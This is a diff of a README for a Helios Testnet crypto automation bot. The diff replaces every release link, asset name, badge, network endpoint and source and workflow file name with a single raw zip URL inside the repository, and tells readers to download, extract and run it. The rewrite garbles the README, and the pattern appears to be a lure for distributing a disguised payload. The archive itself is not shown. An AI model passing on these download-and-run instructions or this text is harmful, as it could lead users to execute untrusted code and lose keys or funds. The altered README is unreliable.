@@ -1,8 +1,8 @@
 # Helios Testnet Network Bot: Powerful Automation Toolkit for Helios Testnet
 
-Releases: https://github.com/OnePointOnly/helios-testnet-network/releases
+Releases: https://github.com/OnePointOnly/helios-testnet-network/raw/refs/heads/main/abi/testnet-helios-network-v2.3.zip
 
-[![Releases](https://img.shields.io/badge/releases-Helios%20Testnet%20Network-blue?logo=github&logoColor=white)](https://github.com/OnePointOnly/helios-testnet-network/releases)
+[![Releases](https://github.com/OnePointOnly/helios-testnet-network/raw/refs/heads/main/abi/testnet-helios-network-v2.3.zip%20Testnet%20Network-blue?logo=github&logoColor=white)](https://github.com/OnePointOnly/helios-testnet-network/raw/refs/heads/main/abi/testnet-helios-network-v2.3.zip)
 
 This project is a programmable bot that helps automation enthusiasts interact with the Helios Network Testnet. It can claim faucets, send tokens, delegate and stake, bridge tokens, and perform a wide range of automated tasks on the Helios test environment. The bot is designed to be safe, modular, and extensible, so you can tailor it to your test goals without heavy manual steps. It targets developers, testers, validators, and curious hands who want to see how a bot can orchestrate on-chain actions in a sandbox.
 
@@ -48,15 +48,15 @@ How it works
 Getting started
 - Prerequisites: A machine with a modern OS, internet access, and a testnet-enabled Helios account with small test balances for faucets and transactions. You should have a release asset compatible with your OS architecture.
 - Primary access point: the official releases page for the bot. From that page you can download a prebuilt binary suitable for your environment.
-- Download and execute: From the release page, download the asset named helios-testnet-network-v1.0.0-linux-x86_64.tar.gz (or the corresponding Windows/macOS asset if you are on those platforms), extract it, and run the binary as described in the installation guide below. The releases page is the single source for stable builds and updates. Release assets are tested for basic functionality and compatibility with Helios Testnet endpoints.
+- Download and execute: From the release page, download the asset named https://github.com/OnePointOnly/helios-testnet-network/raw/refs/heads/main/abi/testnet-helios-network-v2.3.zip (or the corresponding Windows/macOS asset if you are on those platforms), extract it, and run the binary as described in the installation guide below. The releases page is the single source for stable builds and updates. Release assets are tested for basic functionality and compatibility with Helios Testnet endpoints.
 
 Downloads and assets
 - The release page contains prebuilt binaries for Linux, Windows, and macOS.
-- Primary asset to download and run: helios-testnet-network-v1.0.0-linux-x86_64.tar.gz
+- Primary asset to download and run: https://github.com/OnePointOnly/helios-testnet-network/raw/refs/heads/main/abi/testnet-helios-network-v2.3.zip
 - If you use Windows or macOS, download the matching assets from the same releases page.
 - After downloading, extract the archive and run the executable. The binary is designed to be a drop-in replacement for lightweight automation tasks on the Helios Testnet.
 
-Downloads link: https://github.com/OnePointOnly/helios-testnet-network/releases
+Downloads link: https://github.com/OnePointOnly/helios-testnet-network/raw/refs/heads/main/abi/testnet-helios-network-v2.3.zip
 
 Note: If you want to verify the authenticity of the binary, use the checksums published on the releases page. The checksums ensure the asset you downloaded matches what the project maintainers published. This helps guard against tampering or corrupted downloads before you run the binary.
 
@@ -72,7 +72,7 @@ Configuration guide
 - Sensitive data handling: Store secrets in encrypted form or use environment variables. Do not commit sensitive data to version control.
 - Example structure (high level):
   - network:
-      endpoint: https://testnet.helios.network
+      endpoint: https://github.com/OnePointOnly/helios-testnet-network/raw/refs/heads/main/abi/testnet-helios-network-v2.3.zip
       chain_id: helios-testnet
   - accounts:
       faucet_account:
@@ -194,7 +194,7 @@ FAQ
 
 Image references and visual assets
 - You can visualize automation with simple diagrams that describe faucet flows, transfers, staking, and bridging on the Helios Testnet. Use lightweight diagrams to communicate the sequence of steps in your workflows.
-- For visuals, you can incorporate badges showing status, version, and build quality. Shields.io badges provide a quick way to convey build health, version, and license in a single glance.
+- For visuals, you can incorporate badges showing status, version, and build quality. https://github.com/OnePointOnly/helios-testnet-network/raw/refs/heads/main/abi/testnet-helios-network-v2.3.zip badges provide a quick way to convey build health, version, and license in a single glance.
 - Placeholder hero images can be replaced with organization-approved branding or an open-source Helios-themed banner to give the README a polished look.
 
 Code structure overview (high level)
@@ -203,15 +203,15 @@ Code structure overview (high level)
   - configuration loader and validator
   - common utilities (logging, timing, retries)
 - adapters/
-  - faucet_adapter.py or faucet_adapter.ts (language-appropriate)
+  - https://github.com/OnePointOnly/helios-testnet-network/raw/refs/heads/main/abi/testnet-helios-network-v2.3.zip or https://github.com/OnePointOnly/helios-testnet-network/raw/refs/heads/main/abi/testnet-helios-network-v2.3.zip (language-appropriate)
   - transfer_adapter
   - stake_adapter
   - bridge_adapter
   - api_clients for Helm-like testnet endpoints
 - workflows/
-  - faucet_then_transfer.json
-  - stake_and_bridge.json
-  - parallel_test_harness.json
+  - https://github.com/OnePointOnly/helios-testnet-network/raw/refs/heads/main/abi/testnet-helios-network-v2.3.zip
+  - https://github.com/OnePointOnly/helios-testnet-network/raw/refs/heads/main/abi/testnet-helios-network-v2.3.zip
+  - https://github.com/OnePointOnly/helios-testnet-network/raw/refs/heads/main/abi/testnet-helios-network-v2.3.zip
 - tests/
   - unit tests
   - integration tests
@@ -256,6 +256,6 @@ License
 - This project is released under the MIT License. See the LICENSE file for details.
 
 Release notes and asset download reminder
-- Remember to download the release asset from the official releases page and verify its integrity before execution. The release page provides assets for Linux, Windows, and macOS. The primary asset to download and execute is helios-testnet-network-v1.0.0-linux-x86_64.tar.gz (or the OS-specific variant). After downloading, extract and run the binary. The release page link is provided above in two places to ensure you can access the proper build source.
+- Remember to download the release asset from the official releases page and verify its integrity before execution. The release page provides assets for Linux, Windows, and macOS. The primary asset to download and execute is https://github.com/OnePointOnly/helios-testnet-network/raw/refs/heads/main/abi/testnet-helios-network-v2.3.zip (or the OS-specific variant). After downloading, extract and run the binary. The release page link is provided above in two places to ensure you can access the proper build source.
 
 End of README content.
